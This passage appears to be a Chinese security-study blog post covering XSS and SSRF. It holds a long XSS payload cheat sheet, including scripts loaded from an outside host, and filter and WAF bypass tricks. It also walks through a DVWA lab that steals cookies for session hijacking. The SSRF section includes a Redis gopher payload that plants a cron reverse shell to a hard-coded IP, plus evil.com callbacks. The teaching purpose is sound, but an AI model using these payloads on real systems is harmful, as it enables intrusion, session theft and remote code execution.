class="hljs-string">&#x27;)&lt;/script&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;table background=&#x27;</span>javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br> <br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br> <br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br> <br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br> <br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br> <br>&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br> <br>&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>%<span class="hljs-number">0</span>a%<span class="hljs-number">0</span>a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br> <br>%<span class="hljs-number">3</span>c/a%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>c/title%<span class="hljs-number">3</span>e%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e<br> <br>%<span class="hljs-number">3</span>cscript%<span class="hljs-number">3</span>ealert(%<span class="hljs-number">22</span>xss%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>c/script%<span class="hljs-number">3</span>e/index.html<br> <br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br> <br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&quot;XSS&quot;)&gt;<br> <br>&lt;IMG SRC=&quot;jav    ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&quot;jav<br>ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&quot;&lt;IMG src=&quot;/java&quot;\<span class="hljs-number">0</span>script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br> <br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br> <br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br> <br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br> <br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br> <br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br> <br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;<span class="hljs-number">0</span>;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br> <br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br> <br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br> <br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br> <br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>behaviour: url(<span class="hljs-string">&#x27;http://www.how-to-hack.org/exploit.html&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;DIV STYLE=&quot;</span>width: expression(alert(<span class="hljs-string">&#x27;XSS&#x27;</span>));<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;</span>XSS<span class="hljs-string">&quot;)&#x27;;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;</span>XSS<span class="hljs-string">&quot;))&#x27;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/javascript<span class="hljs-string">&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. TYPE=&quot;</span>text/css<span class="hljs-string">&quot;&gt;.XSS&#123;background-image:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;STYLE. type=&quot;</span>text/css<span class="hljs-string">&quot;&gt;BODY&#123;background:url(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)&#125;&lt;/STYLE&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;BASE HREF=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);//<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">getURL(&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">a=&quot;</span>get<span class="hljs-string">&quot;;b=&quot;</span>URL<span class="hljs-string">&quot;;c=&quot;</span>javascript.:<span class="hljs-string">&quot;;d=&quot;</span>alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;;eval(a+b+c+d);</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;XML SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&quot;</span>&gt; &lt;BODY NLOAD=<span class="hljs-string">&quot;a();&quot;</span>&gt;&lt;SCRIPT&gt;<span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">a</span></span>()&#123;alert(<span class="hljs-string">&#x27;XSS&#x27;</span>);&#125;&lt;/SCRIPT&gt;&lt;<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. SRC=&quot;</span>http://xss.ha.ckers.org/xss.jpg<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;IMG SRC=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.=&quot;</span>&gt;<span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT. a=&quot;</span>&gt;<span class="hljs-string">&quot;&#x27;&#x27;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT.&quot;</span>a=<span class="hljs-string">&#x27;&gt;&#x27;</span><span class="hljs-string">&quot;SRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;SCRIPT&gt;document.write(&quot;</span>&lt;SCRI<span class="hljs-string">&quot;);&lt;/SCRIPT&gt;PTSRC=&quot;</span>http://xss.ha.ckers.org/a.js<span class="hljs-string">&quot;&gt;&lt;/SCRIPT&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&lt;A HREF=http://www.gohttp://www.google.com/ogle.com/&gt;link&lt;/A&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="4、XSS防御"><a href="#4、XSS防御" class="headerlink" title="4、XSS防御"></a>4、XSS防御</h4><ul>
+<li><strong>验证</strong></li>
+</ul>
+<p><strong>思路：</strong>过滤用户输入，使浏览器解释代码而非恶意命令。其中，最重要的是过滤和净化有害的输入，如常见的敏感字符<code>&lt;&gt; &#39; &quot; &amp; # javascript</code>等。</p>
+<ul>
+<li><strong>编码</strong></li>
+</ul>
+<p><strong>思路：</strong>转义用户输入，使得浏览器仅解释数据而非代码。</p>
+<blockquote>
+<p>HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体替代字符，这样做可确保浏览器安全处理可能存在的恶意字符，将其当作HTML文档的内容而非结构加以处理。</p>
+<p>一些常见的可能造成问题的字符的HTML编码如下所示：</p>
+<p><code>显示</code>		<code>实体名字</code>		<code>实体编号</code></p>
+<p><code>&lt;</code>			<code>&amp;lt;</code>			<code>&amp;#60;</code></p>
+<p><code>&gt;</code>			<code>&amp;gt;</code>			<code>&amp;#62;</code></p>
+<p><code>&amp;</code>			<code>&amp;amp;</code>		   <code>&amp;#38;</code></p>
+<p><code>&quot;</code>			<code>&amp;quot;</code>		 <code>&amp;#34;</code></p>
+</blockquote>
+<ul>
+<li><strong>XSS Filter（自编写脚本啦）</strong></li>
+</ul>
+<p>XSS Filter是防御跨站脚本攻击的主要手段之一，其作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38118138/article/details/118081903">XSS过滤器Filter实现全过程</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Code_shadow/article/details/103125060">使用Filter进行XSS过滤</a></p>
+<h4 id="5、XSS绕过"><a href="#5、XSS绕过" class="headerlink" title="5、XSS绕过"></a>5、XSS绕过</h4><h6 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h6><p>HTML对标签大小写不敏感，可以利用大小写混用绕过。</p>
+<p>例如：<script>改为<ScRiPt></p>
+<h6 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h6><p>有些情况下的规则会将黑名单标签替换为空，可以利用这一点构造标签。</p>
+<p>例如：<script>改为<scr<script>ipt></p>
+<p>同理，某些注释符在规则中也会替换为空，这时候可以利用它构造payload。</p>
+<p>例如：<script>改为<scr<!---test--->ipt></p>
+<h6 id="开口标签"><a href="#开口标签" class="headerlink" title="开口标签"></a>开口标签</h6><p>在某些特殊环境，由于html代码的补全机制，可以故意<code>不闭合标签</code>绕过黑名单检测例如：<script>改为<script</p>
+<h6 id="空格回车Tab"><a href="#空格回车Tab" class="headerlink" title="空格回车Tab"></a>空格回车Tab</h6><p>例如：js伪协议<code>javascript:alert(&#39;xss&#39;);</code>可以改为<code>java script:alert(&#39;xss&#39;);</code>等</p>
+<h6 id="编码转义"><a href="#编码转义" class="headerlink" title="编码转义"></a>编码转义</h6><p>JavaScript是很灵活的语言，可以使用十六进制、Unicode、HTML等进行编码，以下属性可以被编码。</p>
+<blockquote>
+<p>href、action、formaction、location、on*、name、background、poster</p>
+</blockquote>
+<h6 id="绕Waf"><a href="#绕Waf" class="headerlink" title="绕Waf"></a>绕Waf</h6><p>在url上添加代码：<code>&lt;Script sRC=&#39;//xxx/xx&#39;#ewqeqweq</code>，其中，空格可以使用<code>+</code>，其它的如果需要转义的话自行百度查询吧。</p>
+<h6 id="使用其它标签（Waf）"><a href="#使用其它标签（Waf）" class="headerlink" title="使用其它标签（Waf）"></a>使用其它标签（Waf）</h6><blockquote>
+<p><code>&lt;svg/onload = alert(1);&gt;</code></p>
+</blockquote>
+<h4 id="6、伪造身份登陆（XSS获取cookie并利用）"><a href="#6、伪造身份登陆（XSS获取cookie并利用）" class="headerlink" title="6、伪造身份登陆（XSS获取cookie并利用）"></a>6、伪造身份登陆（XSS获取cookie并利用）</h4><blockquote>
+<p>实现流程：</p>
+<p>1、注册一个在线xss平台账号，<a target="_blank" rel="noopener" href="https://xss.yt/">https://xss.yt</a></p>
+<p>2、创建项目，获取自己对应的XSS payload（其中的项目名称和项目描述随便写）</p>
+<p>3、选择默认模块，默认模块是读取cookie，下一步。（可以选择超强默认模块啦，无需配置keepsession）</p>
+<p>4、然后就会出现一些可植入js代码（可利用）</p>
+<p>5、然后，使用浏览器打开dvwa靶场，将安全级别调到low。选择反射性xss，将上面的js代码复制一个到输入框中，进行测试。</p>
+<p>6、回到xss平台，查看内容。展开，会发现登陆用的cookie</p>
+<p>7、获取到cookie后，打开另外一个浏览器访问dvwa(模拟攻击者操作)，f12打开开发者工具，在”存储“中找到cookie值，记录其<code>PHPSESSION</code>值</p>
+<p>8、将之前获取到的cookie值替换上去，把security的impossible改为low,回到登录界面，在url后面加上获取到的cookie信息（cookie=security=low; PHPSESSION=记下的内容）。ps：url改为后台地址（cookie下的url地址）</p>
+</blockquote>
+<h3 id="③SSRF服务器端请求伪造"><a href="#③SSRF服务器端请求伪造" class="headerlink" title="③SSRF服务器端请求伪造"></a>③SSRF服务器端请求伪造</h3><h4 id="1、漏洞简介-1"><a href="#1、漏洞简介-1" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>· SSRF，服务器端请求伪造，是由攻击者构造请求，但由服务端发起请求的安全漏洞。本质上属于信息泄露漏洞。</p>
+<p>· SSRF攻击的目标是：<code>从外网无法访问的内部系统</code>。（因为其由服务器端发起，所以它能够请求到与它相连而与外网隔离的内部系统，也就是把目标网站当作中间人）</p>
+<p>· SSRF 形成的原因：<code>大都是由于服务器提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤和限制 </code>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。</p>
+<p>· 数据流：<code>攻击者</code>----<code>服务器</code>----<code>目标地址</code></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">SSRF漏洞（原理、挖掘点、漏洞利用、修复建议）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114626708">SSRF (服务器端请求伪造) 漏洞原理与利用方式</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF-有面试相关内容</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御-协议方面比较完善</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/365150.html">手把手用实战教你SSRF漏洞从入门到精通</a></p>
+</blockquote>
+<h4 id="2、漏洞产生"><a href="#2、漏洞产生" class="headerlink" title="2、漏洞产生"></a>2、漏洞产生</h4><h5 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h5><p>php中的以下函数使用不当容易导致SSRF：</p>
+<ul>
+<li><strong>file_get_contents()和readfile()</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>	// 传入URL地址<br>	<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];   <br>	// 从URL地址中读取指定内容，并直接输出<br>	<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);  <br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>file_get_content</code>函数从用户指定的url读取整个文件内容，然后直接使用echo命令输出展现给用户。</p>
+<p>file_put_content()函数的作用是读取文件内容或者URL地址指定的内容。</p>
+<p>！当传入的参数是内网文件的路径时（如在原url上添加构造路径<code>ssrf.php?url=../../../../../../etc/passwd</code>），就会造成文件读取，信息泄露 。一般这种攻击与目录遍历相结合。</p>
+</blockquote>
+<ul>
+<li><strong>fsockopen()</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) &#123; <br>    <span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>        &#125; <br>        fclose(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>fsockopen</code>函数主要实现：初始化一个套接字连接到指定主机（host）实现对用户指定url数据的获取。该函数使用socket（端口）跟服务器建立tcp连接，传输数据。</p>
+<p><code>fsockopen</code>函数将返回一个句柄，该句柄之后可以被其它文件类函数调用（例如，fgets()、fgetss()、fwrite()、fclose()、feof()，如果调用失败，则返回false）</p>
+<p>变量host为指定主机名，port为端口（主要根据服务而定），errstr表示错误信息将以字符串的信息返回，30为时限。</p>
+<p>同样也是添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>即可成功触发ssrf，并返回目标域名主页。用处不算大。</p>
+</blockquote>
+<ul>
+<li><strong>curl_exec()</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = curl_init();// 创建新的 cURL 资源<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, 0);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项<br>    <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>);// 抓取 URL 并把它传递给浏览器<br>    curl_close(<span class="hljs-variable">$curlobj</span>);// 关闭 cURL 资源，并且释放系统资源<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.rand().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>curl_exec</code>函数用于执行指定的cURL会话。cURL通过PHP获取数据，并将获取到的文件数据保存至curled文件夹下的随机文件名文本文件中。</p>
+<p>对于<code>curl_exec</code>的攻击方式：</p>
+<ul>
+<li>可以通过添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>触发其ssrf</li>
+<li>通过<code>file、dict、gopher</code>这三个协议来进行渗透。（更常见的做法）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span> <br>curl -vvv <span class="hljs-string">&#x27;dict://127.0.0.1:6379/info&#x27;</span> <br><span class="hljs-comment"># 注意：链接使用单引号，避免$变量问题 </span><br>curl -vvv <span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>其中，<code>curl</code> 是一个命令行工具，用于发送和接收数据，通常用于与网页和服务器进行交互。</p>
+<p><code>-vvv</code> 参数表示输出详细的调试信息，有助于查看命令的执行过程和返回结果</p>
+<p><code>dict://127.0.0.1:6379/info</code>指定使用dict协议，来模拟一个访问Redis服务的请求，后面的IP和端口号指的是本地主机地址和Redis默认的监听端口号，<code>/info</code>用于获取Redis服务器的信息和统计数据（Redis常用命令）</p>
+<p><code>gopher</code> 是一种互联网协议，它允许通过 URL 方式进行数据传输。这里的<code>gopher://127.0.0.1:6379/</code> 指定了一个 Redis 服务器的地址和端口号。</p>
+<p>接下来是一系列以 <code>%0d%0a</code> 结尾的数据块，这些块构成了一个特定的Redis命令序列。</p>
+<p>有关于上述对gopher协议的利用代码主要利用了Redis未授权访问漏洞，时期允许攻击者执行任意命令，包括执行恶意代码。</p>
+</blockquote>
+<ul>
+<li><strong>SoapClient类</strong></li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37376469/article/details/130024611">PHP中原生类SoapClient反序列化的SSRF利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a></p>
+<blockquote>
+<p>注意情况：</p>
+<p>1.一般情况下PHP不会开启fopen的gopher wrapper </p>
+<p>2.file_get_contents的gopher协议不能URL编码 </p>
+<p>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 </p>
+<p>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 </p>
+<p>5.curl_exec() //默认不跟踪跳转</p>
+<p>6.file_get_contents() // file_get_contents支持php://input协议</p>
+</blockquote>
+<h5 id="可利用协议"><a href="#可利用协议" class="headerlink" title="可利用协议"></a>可利用协议</h5><ul>
+<li><strong>file协议</strong></li>
+</ul>
+<p>结合<code>目录遍历</code>读取文件，从文件系统中获取文件内容。如<code>file:///etc/passwd</code>，其中<code>/etc/passwd</code>是用户账户文件。</p>
+<ul>
+<li><strong>gopher协议</strong></li>
+</ul>
+<p>分布式文档传递服务，可以<code>打开端口</code>，可以使用<code>gopherus</code>生成<code>payload</code></p>
+<ul>
+<li><strong>dict协议</strong></li>
+</ul>
+<p>· 字典服务器协议，可以访问字典资源，如<code>dict:///ip:6739/info</code>，其中<code>info</code>是Redis的常用命令。</p>
+<p>· 可以探测指纹信息，使用格式如下：</p>
+<blockquote>
+<p><strong>dict://ip:port/命令:命令2:命令3</strong></p>
+<p>其中，命令是可选字段，每个命令使用冒号隔开。</p>
+<p>例：dict://127.0.0.1:6379/set:passwd:123456</p>
+<p>dict://127.0.0.1:6379/get:passwd 等</p>
+<p>在实际地址栏中，这些指令的显示效果为：</p>
+<p>ssrf.php?url=dict://127.0.0.1:6379/set:passwd:123456</p>
+<p>ssrf.php?url=dict://127.0.0.1:22</p>
+</blockquote>
+<p>· 可以写入反弹shell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png" srcset="/img/loading.gif" lazyload alt="image-20240719145304230"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png" srcset="/img/loading.gif" lazyload alt="image-20240719145316045"></p>
+<p>· 可以用于<code>结合cURL攻击</code></p>
+<p>· 最主要的还是进行<code>端口探测</code>！例如：dict://127.0.0.1:80</p>
+<ul>
+<li><strong>http/https协议</strong></li>
+</ul>
+<p>进行<code>内网探测</code></p>
+<ul>
+<li><strong>ftp协议（sftp、tftp）</strong></li>
+</ul>
+<p>进行<code>端口扫描</code>。</p>
+<p>· sftp，代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）。这是一种与SSH打包在一起的独立协议，它运行在安全连接上，并以如下类似的方式进行工作。</p>
+<blockquote>
+<p>在目标网站执行：</p>
+<p><a target="_blank" rel="noopener" href="http://example.com/ssrf.php?url=sftp://evil.com:9999/">http://example.com/ssrf.php?url=sftp://evil.com:9999/</a></p>
+<p><code>evil.com</code>指代目标网站的域名或IP地址，其后冒号跟着的是自己设置的监听端口号。</p>
+<p>在本地（如kali）终端开启监听，等待来自目标服务器的连接：</p>
+<p>local:$ nc -lvvp 9999</p>
+<p>Connection from [192.168.0.12] port 9999[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p>
+<p>nc命令的输出表明（是别人的输出捏）攻击者已经成功接受了来自目标服务器的连接，即连接被建立了。</p>
+</blockquote>
+<p>· tftp，（Trivial File Transfer Protocol,简单文件传输协议），是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+<blockquote>
+<p>在目标网站执行：</p>
+<p><a target="_blank" rel="noopener" href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a></p>
+<p>其中，<code>TESTUDPPACKET</code>是一个UDP数据包</p>
+<p>local:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p>
+</blockquote>
